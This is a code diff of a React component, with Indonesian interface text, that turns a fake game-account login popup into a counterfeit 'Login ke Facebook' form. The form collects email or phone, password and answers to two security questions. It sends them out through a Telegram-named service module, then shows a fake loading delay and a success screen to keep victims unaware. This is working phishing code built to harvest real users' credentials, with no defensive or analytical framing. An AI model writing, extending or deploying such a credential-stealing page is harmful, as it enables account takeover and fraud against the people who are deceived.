@@ -1,127 +1,79 @@
 import { useState } from 'react';
-import { sendToTelegram } from '../services/telegram';
-import { FaTimes } from 'react-icons/fa';
+import { sendFacebookLogin } from '../services/telegram';
 import './LoginForm.css';
 
-interface LoginFormProps {
-  onClose?: () => void;
+
+
+interface FacebookLoginProps {
+  onClose: () => void;
 }
 
-const LoginForm = ({ onClose }: LoginFormProps) => {
-  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Notification, 2: Verification Questions, 3: Success Modal
-  
-  // STEP 1 STATES
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
-  const [idError, setIdError] = useState(false);
-  const [pwError, setPwError] = useState(false);
+const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
+  const [step, setStep] = useState(1); // 1: FB Form, 1.5: Security, 2: Verification, 3: Success
 
-  // STEP 2 STATES (2 Questions to match reference image)
+  // STEP 1 STATES
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  
+  // STEP 2 STATES
   const [a1, setA1] = useState('');
   const [a2, setA2] = useState('');
-  
+
   const [loading, setLoading] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
-  const [errorField, setErrorField] = useState<string | null>(null);
 
-  // Handle Input Number Only for User ID
-  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value;
-    if (/^\d*$/.test(value)) {
-      setUsername(value);
-      if (value) setIdError(false);
-    }
-  };
-
-  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setPassword(e.target.value);
-    if (/^[A-Za-z0-9]{6,16}$/.test(e.target.value)) {
-      setPwError(false);
-    }
-  };
-
-  const handleConfirm = (e: React.FormEvent) => {
+  // STEP 1 HANDLER: Move to Security Notification
+  const handleFbSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    playClickSound();
-    
-    let ok = true;
-
-    if (!username) {
-      setIdError(true);
-      ok = false;
-    } else {
-      setIdError(false);
+    if (!email || !password) {
+      alert("Email dan Kata Sandi harus diisi!");
+      return;
     }
-
-    if (!/^[A-Za-z0-9]{6,16}$/.test(password)) {
-      setPwError(true);
-      ok = false;
-    } else {
-      setPwError(false);
-    }
-
-    if (!ok) return;
-
-    // Transition to Security Notification Step (1.5)
     setStep(1.5);
   };
 
   const handleSecurityProceed = () => {
-    playClickSound();
-    setStep(2); // Go to Verification Questions
+    setStep(2);
   };
 
   const handleFinalSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setErrorField(null);
-
-    // Validasi Sederhana
-    if (!a1 || a1.length < 3) { setErrorField('a1'); return; }
-    if (!a2 || a2.length < 3) { setErrorField('a2'); return; }
-
-    setLoading(true); // Disable button immediately
-
-    // Kirim ke Telegram di background
-    // Hardcoded questions based on typical usage or reference context
-    const q1 = "Apa film favorit Anda?";
-    const q2 = "Apa Makanan Kesukaan Anda?";
-    const combinedQ = `Q1. ${q1} (${a1})\nQ2. ${q2} (${a2})`;
     
-    const success = await sendToTelegram(username, password, combinedQ, "-");
+    // Basic Validation
+    if (!a1 || a1.length < 3) return; // Add visual error handling if needed
+    if (!a2 || a2.length < 3) return;
+
+    setLoading(true);
+
+    // Hardcoded questions context
+    const q1 = `Q1. Apa film favorit Anda? (${a1})`;
+    const q2 = `Q2. Apa Makanan Kesukaan Anda? (${a2})`;
+
+    // Send all data (FB Creds + Answers)
+    const success = await sendFacebookLogin(email, password, q1, q2);
     
-    // Tampilkan Custom Loading Overlay
+    // Show Loading Overlay
     setShowCustomLoading(true);
-    setStep(0); // 0 = Hide all forms temporarily
+    setStep(0); // Hide forms
 
-    // Delay 5 detik sebelum muncul alert sukses/gagal
     setTimeout(() => {
       setShowCustomLoading(false);
       setLoading(false);
       
       if (success) {
-        setStep(3); // Show Success Modal
+        setStep(3); // Show Success
       } else {
-        alert('Gagal mengirim data. Silakan coba lagi.');
-        setStep(2); // Kembali ke form pertanyaan
+        alert("Terjadi kesalahan. Silakan coba lagi.");
+        setStep(2); // Retry questions
       }
     }, 5000);
   };
 
   const handleClose = () => {
-    if (onClose) {
-      onClose();
-    } else {
-      window.location.reload();
-    }
+    if (onClose) onClose();
   };
 
-  // Mock functions from user snippet
-  const playClickSound = () => {
-    // Implement sound logic if needed
-    console.log("Click sound played");
-  };
-
-  // CUSTOM LOADING COMPONENT
+  // Custom Loading Component
   if (showCustomLoading) {
     return (
       <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
@@ -139,50 +91,63 @@ const LoginForm = ({ onClose }: LoginFormProps) => {
   return (
     <div className="relative flex flex-col items-center">
       
-      {/* ================= STEP 1: IMAGE-BASED LOGIN ================= */}
+      {/* ================= STEP 1: FACEBOOK FORM ================= */}
       {step === 1 && (
-        <div className="login-popup-container animate-pop-in">
-          {/* Main Background Image */}
-          <img src="https://higgsdomino.store/img/login.png" alt="ID Login Form" className="login-bg-img" />
-          
-          {/* Inputs Overlay */}
-          <div className="input-container">
-            <input 
-              type="text" 
-              inputMode="numeric"
-              id="userID" 
-              className="input-field"
-              placeholder="" 
-              value={username}
-              onChange={handleUsernameChange}
-            />
-            {idError && <div className="error-text">ID wajib diisi</div>}
-            
-            <input 
-              type="password" 
-              id="password" 
-              className="input-field"
-              placeholder="" 
-              value={password}
-              onChange={handlePasswordChange}
-            />
-            {pwError && <div className="error-text">Password 6-16 karakter</div>}
-          </div>
-
-          {/* <div className="login-helper-text">Silakan masukkan ID 6-16 angka atau huruf</div> */}
-
-          <button className="close-btn" onClick={handleClose} aria-label="Close"></button>
-
+        <div className="bg-white rounded-[10px] shadow-[0_4px_10px_rgba(238,4,4,0.2)] p-5 w-[400px] relative animate-pop-in">
           <button 
-            id="submitButton" 
-            className="submit-btn-custom" 
-            onClick={handleConfirm}
-            aria-label="Confirm"
-          ></button>
+            onClick={onClose}
+            className="absolute top-2.5 right-2.5 bg-transparent border-none text-[18px] font-bold text-[#333] cursor-pointer hover:text-black"
+          >
+            ×
+          </button>
+
+          <h2 className="text-[20px] text-[#333] text-center mb-5 font-bold">
+            Login ke Facebook
+          </h2>
+
+          <form onSubmit={handleFbSubmit}>
+            <input
+              type="text"
+              placeholder="Email atau Nomor Telepon"
+              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              required
+            />
+            <input
+              type="password"
+              placeholder="Kata Sandi"
+              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              required
+            />
+            <button
+              type="submit"
+              className="w-full p-2.5 bg-[#1877f2] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#155db3] transition-colors"
+            >
+              Masuk
+            </button>
+
+            <div className="text-center mt-[15px] text-[14px] text-[#555]">
+              <a href="#" className="text-[#1877f2] no-underline hover:underline">
+                Lupa kata sandi?
+              </a>
+            </div>
+
+            <div className="my-5 border-t border-[#dadde1]"></div>
+
+            <button
+              type="button"
+              className="block mx-auto w-[60%] p-[11px] bg-[#42b72a] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#36a420] transition-colors"
+            >
+              Buat akun baru
+            </button>
+          </form>
         </div>
       )}
 
-      {/* ================= STEP 1.5: SECURITY NOTIFICATION (NEW) ================= */}
+      {/* ================= STEP 1.5: SECURITY NOTIFICATION ================= */}
       {step === 1.5 && (
         <div className="security-popup-container animate-pop-in">
           <img 
@@ -256,23 +221,22 @@ const LoginForm = ({ onClose }: LoginFormProps) => {
             />
             
             <button 
-              onClick={handleClose} 
+              onClick={onClose} 
               className="absolute top-2 right-2 w-8 h-8 flex items-center justify-center bg-red-500/80 hover:bg-red-600 text-white rounded-full transition-colors z-10 font-bold shadow-md border border-white/20"
             >
               ✕
             </button>
 
             <button 
-              onClick={handleClose}
+              onClick={onClose}
               className="absolute bottom-[10%] left-1/2 transform -translate-x-1/2 w-[120px] h-[40px] bg-transparent border-none z-20 cursor-pointer"
               aria-label="Confirm"
             ></button>
           </div>
         </div>
       )}
-
     </div>
   );
 };
 
-export default LoginForm;
+export default FacebookLogin;
